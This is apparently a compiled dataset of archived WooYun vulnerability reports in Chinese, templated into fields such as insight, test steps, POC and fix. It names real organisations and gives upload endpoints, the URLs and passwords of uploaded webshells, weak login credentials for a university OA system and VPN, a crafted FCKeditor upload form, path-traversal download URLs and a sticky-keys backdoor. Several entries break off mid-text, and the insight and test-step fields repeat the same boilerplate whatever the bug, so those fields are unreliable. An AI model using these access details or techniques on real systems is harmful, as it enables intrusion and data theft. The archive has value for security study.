### [wooyun-2015-0132695] 多个OA系统任意文件上传漏洞打包
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080414353934005452034.jsp     k8**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080414322354364248413.jsp      k8**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080414304748258242144.jsp    k8**.**.**.**/defaultrootht

**POC**: 以东风汽车股份有限公司为例：**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080403531780230087662.jsp密码为tom使用k8飞刀连接。可能有些链接已经失效了，按照wooyun-2014-064324提供的方法复现即可。谢谢作者提供的方法。

**绕过**: 直接利用

**修复**: 速度修复！！！上学去了。
---

---
### [wooyun-2015-0120348] 某省财经大学oa系统弱口令（vpn,教师系统，学生系统沦陷）
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://oa.sdufe.edu.cn/set_book.php?online=1test test 进行登录可以进行文件上传，并没有进行尝试19857676 000000进行登录https://vpn.sdufe.edu.cn/por/service.csp?rnd=lmgjiilfibhgggbd19877169 wuyun123教学系统没有开通 默认密码为用户名图书系统也是没有开通 默认密码为用户名

**POC**: http://oa.sdufe.edu.cn/set_book.php?online=1test test 进行登录可以进行文件上传，并没有进行尝试19857676 000000进行登录https://vpn.sdufe.edu.cn/por/service.csp?rnd=lmgjiilfibhgggbd19877169 wuyun123教学系统没有开通 默认密码为用户名图书系统也是没有开通 默认密码为用户名

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2015-0119938] 国金证劵某系统存在任意文件上传漏洞可执行任意代码
**厂商**: 国金证劵 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://mail.gjqh.com.cn:9090/webcall/messageNoteAdd.jsp问题出在附件上传处，未对上传的文件进行过滤，虽然系统在访问jsp、jspx等木马文件时会跳转到登录页，但可以绕过因为系统的任务类型处没有值，但其又是必填项，所以只能本地构造数据包进行上传POST http://im.gjzq.cn:9090/webcall/messageNoteAdd.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://im.gjzq.cn:9090/webcall/messageNoteAdd.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6

**POC**: 上传后文件存在在根目录下的upload文件夹http://mail.gjqh.com.cn:9090https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.JSPX我们利用linux系统的一些特性，后缀使用大写字母再次上传一句话http://mail.gjqh.com.cn:9090https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/wooyun.JSPX密码：023

**绕过**: 过滤绕过

**修复**: 上传点后缀过滤，加强权限控制
---

---
### [wooyun-2013-047090] 泉州移动在线营业厅任意文件上传漏洞
**厂商**: 中国移动 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 链接：http://www.qz10085.com/zxb.html 可任意上传

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 俺是菜鸟。
---

---
### [wooyun-2014-050231] 大连教师网IIS配置不当导致任意代码执行(涉及大量教师数据)
**厂商**: 大连教师网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题还是配置IIS时1.WEB服务器扩展里设置WebDAV为允许2.网站权限配置里开启了写入权限http://study.dlteacher.com/ 大连市教师学习中心测试步骤依旧和上一个一样，直接利用iis6.0的解析漏洞传一句话提权什么的无压力，3389也开着，不过发现已经被光顾过了，数据库中47681条教师的详细资料可能已被泄露当然网站管理方的安全意识也需提高，这不仅仅体现在iis的配置上，包括就连ftp的连接账号密码居然也用文本存起来，数据库备份文件、网站源码通通与网站根目录同一文件夹中，并且可以任意下载。

**POC**: 如上

**绕过**: 直接利用

**修复**: 1、禁止webdav2、关闭写权限
---

---
### [wooyun-2015-0146124] 网站安全狗防护功能缺陷导致Apache崩溃bug
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件上传防护存在缺陷导致apache崩溃bug，关闭网马防护则没有该问题。网站安全狗（APACHE版）for Windows测试主程序版本：3.5.11730测试网马库版本：2015-09-21及2015-10-08测试环境：vmware Windows xp sp3，apache+php+mysql集成环境，其中的apache版本是**.**.**.**测试过程如下：本来是在尝试上传绕过，期间利用了ntfs文件系统的一些特性，发现在上传的文件名中包含\（反斜杠）、:（冒号）、/（斜杠）这些特殊字符时，可导致apache出现崩溃。写个上传页面，上传文件名类似如下：22.\22.php\22.php:22:22.php :22.php/结果如下：连续3次提交文件：但是httpd.exe仍在提供服务，网站仍然是正常运行的。故风险较低，你们可以试试能不能导致web服务宕掉。

**POC**: 参考详细说明。

**绕过**: 过滤绕过

**修复**: 检查上传防护代码及处理规则。
---

---
### [wooyun-2013-028531] 新加坡教育部strust2代码执行
**厂商**: moe.gov.sg | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://tgonline.moe.gov.sg/tgis/secure/loginStudent.action

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066062] 编吧资讯某系统漏洞导致服务器沦陷
**厂商**: 编吧资讯 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: down.bianbar.com采用KODExplorer该系统存在任意文件上传漏洞。具体：WooYun: 芒果云KODExlporer设计缺陷任意代码执行

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更新吧
---

---
### [wooyun-2012-09415] 韩国某web编辑器0day
**厂商**: 韩国 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主要问题在于上传类在对文件扩展名做验证的时候不严谨导致攻击者可上传PHP。By Ca3tie1先看上传函数：if ($file->getFileSize("Filedata") > 0) {$save_name = $req->get("save_name");if ($save_name == null || $save_name == "")$save_name = $file -> nameUnique('ph_');$file_name = $file->getFileName("Filedata");if ($file -> isUploadable($file_name))   //扩展名的验证，如果验证不过则扩展名定死为tmp。$file_ext = $file->name2Ext($file_name);  //取出扩展名else$file_ext = 'tmp';$sav

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂的~！！！
---

---
### [wooyun-2014-083703] 轻探金山批量猜解MD5的hadoop集群
**厂商**: 金山毒霸 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://221.228.204.53:8080/（别问我为什么这个是金山的，看看54和46）先是简单的一个列目录然后翻了翻找到一个霸气系统http://221.228.204.53:8080/N-grammar/web/ui/可以上传文件其中有一处查看自己的任务，可以下载任意文件我上传了几个php文件，不是md5猜解，没有结果，所以现在看不到下载按钮了，就在结果列：关键代码：function download_file(){if(!empty($_REQUEST['download_file'])){$downfilename = $_REQUEST['download_file'];$tfile = $_SERVER['DOCUMENT_ROOT']."/N-grammar/web/data/result/".$downfilename;if (file_exists($tfile

**POC**: http://221.228.204.53:8080/N-grammar/webhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/task/test4.php

**绕过**: 直接利用

**修复**: 把上传、下载的代码再改改，顺便建议：这么好的环境，留下来吧，大家都能用O(∩_∩)O~
---

---
### [wooyun-2014-048626] 中国邮政陕西邮政任意文件上传
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点未做升级补丁，造成漏洞产生、。http://www.post.com.cn/路径自己找下。

**POC**: 站点未做升级补丁，造成漏洞产生、。路径自己找下。

**绕过**: 直接利用

**修复**: 升级补丁，这个漏洞好久了。找厂商。
---

---
### [wooyun-2012-011884] 重庆慈善总会，重庆民政局网站漏洞，突破安全狗防护
**厂商**: 重庆慈善总会 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级fckeditor目录权限做限制藐视还可以提权...大牛们指点
---

---
### [wooyun-2014-066524] 某市教育局学籍管理系统S2任意代码执行(涉及全市学生信息)
**厂商**: 德阳教育局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: S2漏洞执行..http://218.6.145.99:8088//cmis/common/usersAction_login.action

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级...shell已删.在E盘下发现MinerCache ..疑已被别人利用
---

---
### [wooyun-2016-0198375] 银承库后台存在多个弱口令账户与任意文件上传漏洞（可影响海量银行承诺汇票）
**厂商**: 银承库 | **年份**: 2016 | **类型**: 后台弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**:8082/后台验证码不过期,可重复使用,大数据爆破,密码123456的用户zhangxiaomeizhangjingliuxiazhangqijiangnanzhanglixukaichenlingwangjianbaiyunwangzhiweizhanglulijieShiLei其中有可以添加管理权限直接添加个系统管理员方便看

**POC**: 上传点  本来应该是图片服务器 不解析的 但是居然可以解析jsproot权限内网

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019077] 梦洁家纺分站任意文件上传漏洞
**厂商**: mendale.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对上传过滤不足.造成任意文件上传.直接上图

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-01375] 移动梦网彩信相册任意代码执行
**厂商**: 移动梦网 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Resin服务默认可以执行xtp类型文件，彩信相册的照片，铃声等上传页面的后台程序没有对xtp扩展名过滤，导致可以上传执行代码。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1 删除 resin.conf中的<servlet-mapping url-pattern='*.xtp' servlet-name='xtp'/>部分。2 限制上传白名单扩展名（前台+后台）。3 用户上传目录设置成静态，不允许执行程序。4 彻底清查服务器的程序，删除webshell，清查后门程序。
---

---
### [wooyun-2014-059920] 如何实现物联网设备批量开采比特币？（蠕虫实现剖析）---物联网安全
**厂商**: 各大厂商 | **年份**: 2014 | **类型**: 基础设施弱口令

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 基础设施弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别基础设施弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里以hikvision的设备为例：案例一：1、hikvision海康作为领先的安防产品厂商，产品应用还是非常广泛的，大家也都知道互联网上跑着很多摄像头设备，或是DVR数录设备等，通常情况下一般中小型设备使用的都为精简式架构，如ARM、MIPS等，一是成本低廉，二是低功耗，大多数嵌入式设备的系统为裁剪的LINUX，内部跑着厂商开发的相关应用程序，有busybox命令集，可以运行简单的调试命令，一般telnet或者设备的com口作为系统登录的途径，针对存在弱口令的设备，攻击者基于指纹识别或SHODAN这种大数据，就能轻松实现自动化攻击，如下图。2、以如图一台hikvision DVR设备举例，telnet方式root存在若口令，查看网络连接，设备有频繁连接未知IP，23，80端口的迹象，疑似扫描状态，这里查看详细进程ID，以及操作连接的进程。3、虽然进程显示程序路径在/dev下，但实际并没有

**POC**: 综上所述~

**绕过**: 直接利用

**修复**: 健壮出厂默认口令
---

---
### [wooyun-2015-0152078] 约单app任意用户重置密码
**厂商**: 约单app | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先打开app，重置密码，发送验证码然后我们发现，是4位数的验证码，而且有效期还有10分钟，完全可以爆破出来利用burp爆破可得然后我们就重置了密码，就可以登录进去！另外还有一个任意上传漏洞，但是找不到上传到哪里去了。。就给你们说一下，在投诉那里，插入图片，格式没有做限制！而且发送短信的接口可能被别人利用为发送垃圾短信的接口，你们都修复一下！

**POC**: 首先打开app，重置密码，发送验证码然后我们发现，是4位数的验证码，而且有效期还有10分钟，完全可以爆破出来利用burp爆破可得然后我们就重置了密码，就可以登录进去！

**绕过**: 直接利用

**修复**: 提高验证码位数，限制输入次数，还有好多问题，自己修复吧！
---

---
### [wooyun-2015-091033] 杭州卫生局项目管理系统服务器沦陷
**厂商**: 杭州卫生局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里可以遍历目录http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/任意上传马http://220.191.210.78:8081/kj_projecthttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.jsp?type=bszn上一句话成功3389一改 netstat -ano  看一下 尝试了1314 结果可行无限制简单提权进入服务器

**POC**: 进入服务器

**绕过**: 直接利用

**修复**: 文件目录不严格 还有任意上传
---

---
### [wooyun-2011-02777] 多玩分站上传爆菊漏洞
**厂商**: 广州多玩 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 你懂的。

**POC**: http://z.duowan.com/ucenter/data/tmp/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0111834] 梆梆安全存在任意上传漏洞
**厂商**: 梆梆安全 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html

**POC**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html

**绕过**: 直接利用

**修复**: 任意上传
---

---
### [wooyun-2015-0116314] 中国国旅上传漏洞
**厂商**: 中国国旅 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传未做任何过滤上传点：http://www.whcits.com/xieyou.aspx

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不给20，么有小JJ
---

---
### [wooyun-2015-0124749] 从一个旁站搞到多管理平台沦陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海人，对这个瞄了很久http://www.shyule.org/看了一下旁站，仔细寻找，终于............http://www.bio-tag.com.cn/ftb.imagegallery.aspx可以直接上传一句话没有任何防护，直接提权我没有添加用户，而是替换了shift为任务管理器后门211.152.45.195:12367shift5下调出后门进入里面有不少重要的网站，和部分数据库例举其中几个网站吧乱七八糟的都有当是我的目标是数据库打开web.config发现是智库分离ip指向116.228.40.12是上海市电信的直接打开发现试试8080端口好吧到处结束吧实在没法深入了也懒得深入了求10rank买个T恤跪谢

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 多注意细节，你懂得
---

---
### [wooyun-2014-037018] 邮政行业职业技能鉴定信息管理系统存在弱口令与任意文件上传
**厂商**: 国家邮政局 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://219.141.228.206/admin admin 直接登录

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改管理密码，设置上传限制，加强管理求礼物啊 求rank
---

---
### [wooyun-2014-050466] 中国科学软件网 存在常规漏洞 导致提权
**厂商**: 中国科学软件网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 自己想办法，，
---

---
### [wooyun-2014-086842] 爱奇艺运维门户网站敏感信息泄露并可撞库
**厂商**: 奇艺 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://portal.qiyi.domain220.181.184.53	portal.qiyi.domainhttps://220.181.184.53/.svn/entries8dir2300https://scm.qiyi.domain:18080/svn/portal_operation/trunk/res/publichttps://scm.qiyi.domain:18080/svn/portal_operation2013-03-26T07:50:56.166894Z2269luweijunsvn:special svn:externals svn:needs-lock3eeddd20-9c49-467e-b59e-0c7553dc7369tmpdirlaraveldirstaticdircssdirnagios_apidir.htaccess网站根目录/srv/www

**POC**: 还可撞库，暴力猜解用户密码

**绕过**: 直接利用

**修复**: # 删除
---

---
### [wooyun-2012-011779] 百度Ueditor开源编辑器Java版本jsp文件上传漏洞
**厂商**: 百度 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在imageUp.jsp这里使用java正则表达式验证上传文件的文件名，重新设置文件名的时候，没有使用lastIndexOf()方法来找最后一个点，导致可以上传xx.jpg.jsp,xx.png.jsp等类型文件，强烈建议官方修改这个，虽然官方声明此上传jsp做示例，但很多程序员，站长，基本没有修改就使用了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0107049] 上海外国语大学网络学院官网存在上传漏洞
**厂商**: 上海外国语大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sisunet.shisu.edu.cn/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp  默认上传地址

**POC**: 可直接上传 结合IIS6.0解析   一句话提示文件过小  果断来一发大马直接上传成功  查看源码  得到shell地址权限很大 组建支持可提服务器

**绕过**: 直接利用

**修复**: 更改默认路径
---

---
### [wooyun-2013-044516] GV32CMS V5.3.1最新稳定版多个上传文件漏洞(有利用前提)
**厂商**: GV32CMS | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GV32CMS后台的图片修改页面存在上传漏洞此处的漏洞问题显示，可以本地上传php文件同时，在视频修改界面也存在同样的上传漏洞

**POC**: 对应任意上传漏洞，本地上传一处显示上传成功！对应已知地址，进行访问，得到上传页面显示上传的php文件可以被访问！本地文件图片：

**绕过**: 直接利用

**修复**: 之前贵公司的5.2.4版本的CMS漏洞更多，包括SQL注入，XSS等非常多，但是这一最新版已经修复了很多漏洞！贵公司的效率还是很令人钦佩的，希望贵公司能关注这些细节，将漏洞一一修复！
---

---
### [wooyun-2014-072017] 某建站系统通用型任意文件下载漏洞（全版本通杀）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 技术支持：新禾科技版权所有:河北新禾科技(集团)有限公司 电话:0311-85265566百度dork： inurl:cyportal （案例可参照之前的漏洞）WooYun: 某建站系统通用型文件上传导致任意代码执行继续看了看，发现存在任意文件下载漏洞（包括系统&应用系统本身）反编译 DownloadServlet.class 文件，看到可直接通过参数 filePath 及 templateName 来下载目标文件String filePath = RequestUtil.convertParameter(request.getParameter("filePath"), "iso-8859-1", "gbk");String templateName = RequestUtil.convertParameter(request.getParameter("templateName"), 

**POC**: 这里给出几个漏洞利用案例：#1 http://www.hebkjxx.cn/ 河北省会计信息网①获取 filePathhttp://www.hebkjxx.cn/cyportal1.3/DownloadTemplateFile?operate=all②下载 web.xmlhttp://www.hebkjxx.cn/cyportal1.3/DownloadServlet?filePath=D:/bea/user_projects/domains/hebkjxx_domain/autodeploy/cyportal1.3/WEB-INF/&templateName=web.xml#2 http:/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-071282] 某OA系统存在sql注射+任意文件上传+信息泄露
**厂商**: www.syc.com.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题案例举例：http://oa.syc.com.cn/OA/index/index.aspxhttp://xinhuachongming.com.cn/DSOA_TY/index/index.aspxhttp://221.199.203.230:9001/dsoa/index/index.aspxhttp://180.166.56.106/dsoa/index/index0.aspxhttp://sd.tobacco.com.cn/dsoa_kgj_web/index/index0.aspx1.后台信息泄露，访问后台虽然提示未登录，但是还是能显示部分内容，比如：http://oa.syc.com.cn/oa/useradmin/index.aspx2.oa使用2.6.3版本的fckeditor编辑器，可以上传任意文件，只不过需要点奇葩的文件名：http://oa.syc.com.cn/o

**POC**: 用官网做证明：1.后台信息泄露，访问后台虽然提示未登录，但是还是能显示部分内容，很多目录都这样，访问：http://oa.syc.com.cn/oa/useradmin/index.aspx2.oa使用2.6.3版本的fckeditor编辑器，可以上传任意文件，只不过需要点奇葩的文件名：http://oa.syc.com.cn/oa/FCKeditor/editor/filemanager/connectors/asp/connector.asp本地构造上传页面：这里按理说可以用asp的那个%00 url-decode截断上传的，但是各种传不上，变成随机文件名，这里就可以使用传说中的那个奇葩文

**绕过**: 直接利用

**修复**: 身份验证，过滤啥的。。还没得过奖金如何是好！前面的洞都是小厂商流程好桑心！>_<
---

---
### [wooyun-2013-023410] 中国建设银行投资研究网文件上传漏洞（修改多次依然可绕过）
**厂商**: 中国建设银行投资研究网 | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国建设银行投资研究网存在文件上传漏洞，已经成功。具体细节可以通过qq联系我http://ris.ccb.com/CN/feedback/backdoor.jsphttp://ris.ccb.com/CN/feedback/<form action ="http://ris.ccb.com/journalx/secure/admin/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=File&CurrentFolder=../../../../Jweb_tzyj/CN/feedback/"method="post" name="form1" enctype="multipart/form-data"><input name="NewFile" type=

**POC**: 成功上传了

**绕过**: 直接利用

**修复**: 不会啊
---

---
### [wooyun-2014-050330] 大汉版通JIS统一身份认证系统后台文件另一处上传漏洞
**厂商**: 南京大汉网络有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键点：找到路径、绕过某个无聊的if判断。需要管理员权限

**POC**: jis/manage/sys/opr_logo.jspString strLoadPath = request.getSession().getServletContext().getRealPath("/front");Convert.createDirectory( strLoadPath + "/tmp/" );CommonUploadFile upload = new CommonUploadFile( strLoadPath +"/tmp", "");路径在front下的tmp文件夹接着看：if(strFileName.toLowerCase().endsWith("gif")||s

**绕过**: 过滤绕过

**修复**: 厂商已知
---

---
### [wooyun-2013-026021] 黑龙江省粮食局网站配置不当导致服务器可遭入侵
**厂商**: 黑龙江省粮食局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hljlsj.gov.cn/fileup.aspx此处随意上传。上传后的马可以在image目录找到，没有重命名。马传上去之后当然第一件事就是先看看web.config你会发现sa竟然是空口令但是不知道天朝的大神是咋搞的，连接的时候地址只能写自己的外网IP地址，写localhost都连不上。连上数据库之后发现啥各种个人信息和电话号码啥的，上边还有个OA系统。= =，当然我啥也没干，也不知道前几天烧了多少吨粮食。好吧，既然有sa了下面也就没啥说的了。不过我还是想吐槽一下，虽然前几天粮库失火损失惨重，但其实给服务器加两根内存条还是花不了多少钱的，多多少少也提升一下服务器的性能，不然技术人员远程连接到服务器操作的时候实在是太费劲了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道。
---

---
### [wooyun-2013-022460] 91助手分站上传验证不严
**厂商**: 福建网龙 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 忽然想到上次提交的漏洞：WooYun: 91助手分站上传漏洞又进去看了一下，管理员修复，验证了扩展名。恶意的报错。然而：这地方依然可以上传，上传的原理和第一次提交的一样。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 漏洞一样，修复你们懂的。两个漏洞求礼物。。。。
---

---
### [wooyun-2014-073227] 某通用型校园管理系统SQL注射
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入, 认证接口, 上传功能

